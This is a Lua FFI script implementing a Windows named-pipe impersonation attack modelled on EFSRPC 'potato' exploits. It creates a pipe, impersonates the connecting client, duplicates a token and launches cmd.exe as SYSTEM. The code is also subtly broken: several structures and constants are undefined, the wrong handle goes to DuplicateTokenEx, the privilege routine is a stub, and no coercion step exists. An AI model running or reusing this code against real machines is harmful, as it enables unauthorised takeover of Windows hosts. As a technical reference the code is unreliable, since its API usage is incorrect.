-- Load the FFI library for Windows API
local ffi = require("ffi")

-- include kernel32.dll
local kernel32 = ffi.load("kernel32")

-- Define necessary Windows API types and functions
ffi.cdef[[
typedef int BOOL;
typedef char* LPSTR;
typedef void* LPVOID;
typedef uint32_t DWORD;
typedef void* HANDLE;
typedef int32_t INT;
typedef uint32_t UINT;
typedef int64_t LARGE_INTEGER;
typedef uint32_t ULONG;
typedef uint32_t ULONG_PTR;

typedef struct {
    uintptr_t Internal;
    uintptr_t InternalHigh;
    union {
        struct {
            uint32_t Offset;
            uint32_t OffsetHigh;
        } DUMMYSTRUCTNAME;
        void* Pointer;
    } DUMMYUNIONNAME;
    HANDLE hEvent;
} OVERLAPPED;

HANDLE CreateNamedPipeA(
    LPSTR lpName, 
    DWORD dwOpenMode, 
    DWORD dwPipeMode, 
    DWORD nMaxInstances, 
    DWORD nOutBufferSize, 
    DWORD nInBufferSize, 
    DWORD nDefaultTimeOut, 
    LPVOID lpSecurityAttributes
);
BOOL ConnectNamedPipe(HANDLE hNamedPipe, LPVOID lpOverlapped);
DWORD GetLastError();
BOOL ImpersonateNamedPipeClient(HANDLE hNamedPipe);
BOOL CloseHandle(HANDLE hObject);
INT DuplicateTokenEx(HANDLE hToken, DWORD dwDesiredAccess, LPVOID lpTokenAttributes, INT ImpersonationLevel, INT TokenType, LPVOID phNewToken);
HANDLE GetCurrentProcess();
ULONG WaitForSingleObject(HANDLE hHandle, ULONG dwMilliseconds);
DWORD CreateProcessWithTokenW(HANDLE hToken, DWORD dwLogonFlags, LPSTR lpApplicationName, LPSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPSTR lpCurrentDirectory, LPVOID lpStartupInfo, LPVOID lpProcessInformation);
DWORD NtSetInformationToken(HANDLE TokenHandle, INT TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
HANDLE CreateEventA(void*, int, int, const char*);
int SetEvent(HANDLE);
]]

-- Constants and variables
local PIPE_ACCESS_DUPLEX = 0x00000003
local PIPE_TYPE_BYTE = 0x00000000
local PIPE_READMODE_BYTE = 0x00000000
local NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
local FILE_FLAG_OVERLAPPED = 0x40000000
local TOKEN_ASSIGN_PRIMARY = 0x0001
local TOKEN_DUPLICATE = 0x0002
local GENERIC_ALL = 0x10000000
local CREATE_NEW_CONSOLE = 0x00000010
local EVENT_ALL_ACCESS = 0x1F0003
local CREATE_EVENT_MANUAL_RESET = 0x0001
local CREATE_EVENT_INITIAL_STATE = 0x0002

-- endpoint pipe name
local endpointPipeName = "efsrpc"

-- Convert endpointPipeName to a char pointer
local userPipeName = ffi.new("char[?]", #endpointPipeName + 1)
ffi.copy(userPipeName, endpointPipeName)

-- Function to create a new named pipe
local function createNamedPipe(pipeName)
    local hPipe = ffi.C.CreateNamedPipeA(
        ffi.cast("LPSTR", pipeName),  -- Use ffi.cast to convert Lua string to LPSTR
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE,
        1, -- Max instances
        0, -- Out buffer size
        0, -- In buffer size
        NMPWAIT_USE_DEFAULT_WAIT,
        nil
    )
    if hPipe == ffi.cast("HANDLE", ffi.cast("uintptr_t", -1)) then
        local error = ffi.C.GetLastError()
        print("[-] Failed to create named pipe")
        print("    |-> Error: " .. error)
        return nil
    else
        print("[+] Named pipe is created successfully.")
        print("    [*] Path : " .. pipeName)  -- Use the 'pipeName' argument instead of the char pointer
    end
    return hPipe
end

-- Create userPipeName
local hPipe = createNamedPipe(userPipeName) -- Pass the char pointer

-- default options
local sessionId = 0 
local interactive = true

-- Function to enable token privileges (You need to implement this function)
local function enableTokenPrivileges()
    -- Implement this function using the C APIs
    -- You will need to retrieve the current process token, adjust privileges, etc.
    return true;
end

-- Function to check if an element is in a table
local function contains(table, element)
    for _, value in ipairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

-- Function to connect named pipe
local function connectNamedPipe(hPipe)
    local overlapped = ffi.new("OVERLAPPED")
    overlapped.hEvent = ffi.C.CreateEventA(nil, true, false, nil)
    if not ffi.C.ConnectNamedPipe(hPipe, overlapped) then
        local error = ffi.C.GetLastError()
        if error ~= ERROR_IO_PENDING then
            print("[-] Failed to connect named pipe")
            print("    |-> Error: " .. error)
            ffi.C.CloseHandle(overlapped.hEvent)
            return false
        end
    end
    print("[+] Waiting for named pipe connection.")
    ffi.C.WaitForSingleObject(overlapped.hEvent, -Globals.Timeout * 10000)
    ffi.C.CloseHandle(overlapped.hEvent)
    print("[+] Got named pipe connection.")
    return true
end

-- Function to impersonate named pipe client
local function impersonateNamedPipeClient(hPipe)
    if not ffi.C.ImpersonateNamedPipeClient(hPipe) then
        local error = ffi.C.GetLastError()
        print("[-] Failed to named pipe impersonation.")
        print("    |-> Error: " .. error)
        return false
    else
        local sid = ffi.new("char[?]", 256) -- Adjust the size as needed
        print("[+] Named pipe impersonation is successful (SID: " .. ffi.string(sid) .. ").")
        ffi.C.CloseHandle(hPipe)
        hPipe = ffi.cast("HANDLE", ffi.cast("uintptr_t", -1))  -- Corrected the error in this line
        return true
    end
end

-- Function to duplicate the current token
local function duplicateCurrentToken()
    local hToken = ffi.new("HANDLE[1]")
    if ffi.C.DuplicateTokenEx(ffi.C.GetCurrentProcess(), TOKEN_ASSIGN_PRIMARY + TOKEN_DUPLICATE, nil, 2, 1, hToken) == 0 then
        local error = ffi.C.GetLastError()
        print("[-] Failed to duplicate the current token.")
        print("    |-> Error: " .. error)
        return nil
    end
    return hToken[0]
end

-- Function to create a process with a token
local function createProcessWithToken(hToken, command, startupInfo, processInformation)
    if ffi.C.CreateProcessWithTokenW(
        hToken,
         0,
         nil,
         command,
         CREATE_NEW_CONSOLE,
         nil,
         nil,
         startupInfo,
         processInformation
     ) == 0 then
         local error = ffi.C.GetLastError()
         print("[-] Failed to spawn SYSTEM process.")
         print("    |-> Error: " .. error)
         return false
     else
         print("[+] SYSTEM process is executed successfully (PID = " .. processInformation.dwProcessId .. ").")
         return true
     end
end

-- Entry point for the GetSystem function
local function GetSystem(command, endpointPipeName, sessionId, interactive)
    -- Check if the endpoint pipe name is valid
    local validEndpoints = {"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
    if not contains(validEndpoints, endpointPipeName:lower()) then
        print("[-] Invalid endpoint pipe name is specified.")
        return false
    else
        endpointPipeName = endpointPipeName:lower()
    end

    -- Check if both sessionId and interactive flags are specified
    if sessionId > 0 and interactive then
        print("[!] Session ID and interactive mode flag must not be specified at once.")
        return false
    end

    -- Enable necessary token privileges (You need to implement this function)
    if not enableTokenPrivileges() then
        return false
    end

    local pipeName = string.format("\\\\.\\pipe\\%s\\pipe\\srvsvc", ffi.string(userPipeName))
    local hPipe = createNamedPipe(pipeName)

    if hPipe then
        if connectNamedPipe(hPipe) then
            if impersonateNamedPipeClient(hPipe) then
                local hDupToken = duplicateCurrentToken()

                if interactive then
                    local startupInfo = ffi.new("STARTUPINFO")
                    startupInfo.cb = ffi.sizeof("STARTUPINFO")
                    local processInformation = ffi.new("PROCESS_INFORMATION")
                    if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
                        -- Handle the error
                    end
                else
                    if sessionId > 0 then
                        -- Adjust session ID
                        local pInfoBuffer = ffi.new("int32_t[1]", sessionId)
                        if ffi.C.NtSetInformationToken(hDupToken, 22, pInfoBuffer, 4) ~= 0 then
                            print("[-] Failed to adjust session ID.")
                            -- Handle the error
                        end
                    end

                    local startupInfo = ffi.new("STARTUPINFO")
                    startupInfo.cb = ffi.sizeof("STARTUPINFO")
                    local processInformation = ffi.new("PROCESS_INFORMATION")
                    if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
                        -- Handle the error
                    end
                end

                ffi.C.CloseHandle(hDupToken)
            end
        end
    end

    if hPipe then
        ffi.C.CloseHandle(hPipe)
    end

    print("[*] Done.")
end

-- Call the GetSystem function
GetSystem("cmd.exe", "efsrpc", 0, true)